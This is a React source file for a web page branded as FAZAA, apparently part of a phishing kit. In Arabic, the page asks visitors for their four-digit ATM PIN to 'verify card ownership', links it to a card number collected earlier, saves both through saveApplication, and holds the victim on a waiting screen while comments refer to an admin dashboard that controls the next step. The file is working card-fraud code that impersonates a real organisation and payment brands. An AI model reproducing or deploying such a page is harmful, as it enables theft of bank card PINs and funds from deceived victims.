/* FAZAA PIN Verification — ATM PIN */
import { useState, useRef } from 'react';
import { useLocation } from 'wouter';
import { useApp } from '@/contexts/AppContext';
// Notifications are handled from Admin dashboard only
import LoadingOverlay from '@/components/LoadingOverlay';
import WaitingModal from '@/components/WaitingModal';
import Header from '@/components/Header';
import Footer from '@/components/Footer';

export default function PinVerify() {
  const [, navigate] = useLocation();
  const { appData, setAppData, saveApplication, isLoading, setIsLoading } = useApp();
  const [pins, setPins] = useState(['', '', '', '']);
  const [error, setError] = useState('');
  const [submitted, setSubmitted] = useState(false);
  // Notifications sent from Admin dashboard when redirecting
  const refs = [useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null), useRef<HTMLInputElement>(null)];

  const handlePinChange = (idx: number, val: string) => {
    const digit = val.replace(/\D/g, '').slice(-1);
    const newPins = [...pins];
    newPins[idx] = digit;
    setPins(newPins);
    setError('');
    if (digit && idx < 3) {
      refs[idx + 1].current?.focus();
    }
  };

  const handleKeyDown = (idx: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !pins[idx] && idx > 0) {
      refs[idx - 1].current?.focus();
    }

  };

  const handleConfirm = async () => {
    if (pins.some(p => !p)) {
      setError('يرجى إدخال الرقم السري كاملاً');
      return;
    }
    setIsLoading(true);
    const pinValue = pins.join('');
    await saveApplication({
      ...appData,
      cardPin: pinValue,
      currentPage: '/pin-verify',
    });
    setAppData({ cardPin: pinValue, currentPage: '/pin-verify' });
    
    // Notification will be sent from Admin dashboard
    
    setTimeout(() => {
      setIsLoading(false);
      setSubmitted(true);
    }, 700);
  };

  // Waiting screen after PIN submission
  if (submitted) {
    return (
      <div className="min-h-screen flex flex-col" style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}>
        <Header />
        <main className="flex-1" />
        <Footer />
        <WaitingModal />
      </div>
    );
  }

  // Get last 4 digits of card number for display
  const cardLast4 = appData.cardNumber
    ? appData.cardNumber.replace(/\s/g, '').slice(-4)
    : '****';

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ background: '#050D1A', fontFamily: 'Cairo, sans-serif' }}
    >
      {isLoading && <LoadingOverlay />}
      <Header />

      <main className="flex-1 flex items-center justify-center px-4 py-8">
        <div className="w-full max-w-sm">

          {/* Card container — same blue-dark gradient as CardPayment */}
          <div
            className="rounded-2xl overflow-hidden"
            style={{
              border: '1px solid rgba(29,74,145,0.5)',
              background: 'linear-gradient(160deg, #050D1A 0%, #071020 50%, #0C1A30 100%)',
            }}
          >
            {/* Top section: FAZAA logo top-right */}
            <div className="px-6 pt-6 pb-2 flex items-start justify-end">
              <div
                className="flex flex-col items-center justify-center px-3 py-2 rounded-xl"
                style={{ background: 'rgba(200,160,58,0.12)', border: '1px solid rgba(200,160,58,0.3)' }}
              >
                <div className="font-black leading-none" style={{ color: '#C8A03A', fontSize: '14px' }}>فزعة</div>
                <div className="font-bold leading-none mt-0.5" style={{ color: '#C8A03A', fontSize: '9px', letterSpacing: '1.5px' }}>FAZAA</div>
              </div>
            </div>

            {/* Mastercard + ATM + Network logos row */}
            <div className="px-6 pb-4 flex items-center justify-between">
              {/* Mastercard + Network left side */}
              <div className="flex items-center gap-3">
                {/* Mastercard circles */}
                <div className="flex items-center" style={{ direction: 'ltr' }}>
                  <div className="w-7 h-7 rounded-full" style={{ background: '#EB001B' }} />
                  <div className="w-7 h-7 rounded-full" style={{ background: '#F79E1B', marginLeft: '-10px', opacity: 0.9 }} />
                </div>
                {/* Network International logo */}
                <div style={{ background: 'rgba(255,255,255,0.95)', borderRadius: '6px', padding: '4px 8px', display: 'inline-flex', alignItems: 'center' }}>
                  <img
                    src="/manus-storage/network-international-logo_1b43eda1.png"
                    alt="Network International Payment Solutions"
                    style={{ height: '26px', display: 'block' }}
                  />
                </div>
              </div>
              {/* ATM label right side */}
              <div
                className="font-black"
                style={{ color: '#FFFFFF', fontSize: '22px', letterSpacing: '2px', fontFamily: 'monospace' }}
              >
                ATM
              </div>
            </div>

            {/* Divider */}
            <div style={{ height: '1px', background: 'rgba(255,255,255,0.1)', margin: '0 24px' }} />

            {/* Card ownership info block */}
            <div className="px-6 py-5">
              <h2
                className="text-center font-black mb-3"
                style={{ color: '#C8A03A', fontFamily: 'Cairo, sans-serif', fontSize: '17px' }}
              >
                إثبات ملكية البطاقة
              </h2>
              <p
                className="text-center text-sm leading-relaxed"
                style={{ color: 'rgba(255,255,255,0.65)', fontFamily: 'Cairo, sans-serif', lineHeight: '1.7' }}
              >
                لتأكيد العملية، يرجى إدخال الرقم السري للصراف الآلي المكوّن من 4 خانات
                للتحقق من ملكية البطاقة وإتمام عملية الدفع بأمان.
              </p>
            </div>

            {/* Divider */}
            <div style={{ height: '1px', background: 'rgba(255,255,255,0.1)', margin: '0 24px' }} />

            {/* PIN input section */}
            <div className="px-6 py-5">
              {/* Label */}
              <p
                className="text-center font-bold mb-1"
                style={{ color: '#FFFFFF', fontFamily: 'Cairo, sans-serif', fontSize: '15px' }}
              >
                يرجى إدخال الرقم السري للصراف الآلي (ATM):
              </p>

              {/* Subtitle with card last 4 */}
              <p
                className="text-center text-xs mb-4"
                style={{ color: 'rgba(255,255,255,0.5)', fontFamily: 'Cairo, sans-serif', direction: 'rtl' }}
              >
                أدخل الرمز السري المرتبط بالبطاقة المنتهية بـ ••••{cardLast4}.
              </p>

              {/* Input label */}
              <p
                className="text-sm font-semibold mb-3"
                style={{ color: 'rgba(255,255,255,0.7)', fontFamily: 'Cairo, sans-serif', textAlign: 'right' }}
              >
                أدخل الرمز هنا:
              </p>

              {/* 4 PIN boxes */}
              <div className="flex justify-center gap-3 mb-2">
                {pins.map((pin, idx) => (
                  <input
                    key={idx}
                    ref={refs[idx]}
                    type="password"
                    inputMode="numeric"
                    maxLength={1}
                    value={pin}
                    onChange={e => handlePinChange(idx, e.target.value)}
                    onKeyDown={e => handleKeyDown(idx, e)}
                    style={{
                      width: '56px',
                      height: '56px',
                      borderRadius: '10px',
                      border: `1px solid ${error ? '#D72638' : 'rgba(255,255,255,0.25)'}`,
                      background: 'rgba(255,255,255,0.06)',
                      color: '#FFFFFF',
                      fontSize: '22px',
                      fontWeight: 'bold',
                      textAlign: 'center',
                      fontFamily: 'monospace',
                      outline: 'none',
                      transition: 'all 0.2s',
                      cursor: 'text',
                    }}
                    onFocus={e => {
                      e.currentTarget.style.borderColor = '#4A90D9';
                      e.currentTarget.style.boxShadow = '0 0 0 3px rgba(74,144,217,0.2)';
                    }}
                    onBlur={e => {
                      e.currentTarget.style.borderColor = error ? '#D72638' : 'rgba(255,255,255,0.25)';
                      e.currentTarget.style.boxShadow = 'none';
                    }}
                  />
                ))}
              </div>

              {error && (
                <p className="mt-2 text-xs text-center" style={{ color: '#D72638', fontFamily: 'Cairo, sans-serif' }}>
                  ⚠ {error}
                </p>
              )}

              {/* Confirm button — gold gradient */}
              <button
                onClick={handleConfirm}
                className="w-full mt-4 py-3 rounded-xl font-black text-base transition-all duration-200"
                style={{
                  background: 'linear-gradient(135deg, #C8A03A, #E8C060)',
                  color: '#050D1A',
                  fontFamily: 'Cairo, sans-serif',
                  fontSize: '16px',
                  boxShadow: '0 4px 15px rgba(200,160,58,0.35)',
                  border: 'none',
                  cursor: 'pointer',
                }}
                onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 6px 25px rgba(200,160,58,0.55)'}
                onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.boxShadow = '0 4px 15px rgba(200,160,58,0.35)'}
              >
                تأكيد
              </button>

              {/* Help link */}
              <div className="text-center mt-4">
                <button
                  style={{
                    color: 'rgba(255,255,255,0.45)',
                    fontFamily: 'Cairo, sans-serif',
                    fontSize: '13px',
                    background: 'none',
                    border: 'none',
                    cursor: 'pointer',
                  }}
                  onMouseEnter={e => (e.currentTarget as HTMLButtonElement).style.color = '#C8A03A'}
                  onMouseLeave={e => (e.currentTarget as HTMLButtonElement).style.color = 'rgba(255,255,255,0.45)'}
                >
                  هل تحتاج للمساعدة؟
                </button>
              </div>
            </div>
          </div>

        </div>
      </main>

      <Footer />

      <style>{`
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        @keyframes bounce { 0%, 80%, 100% { transform: translateY(0); } 40% { transform: translateY(-8px); } }
      `}</style>
    </div>
  );
}
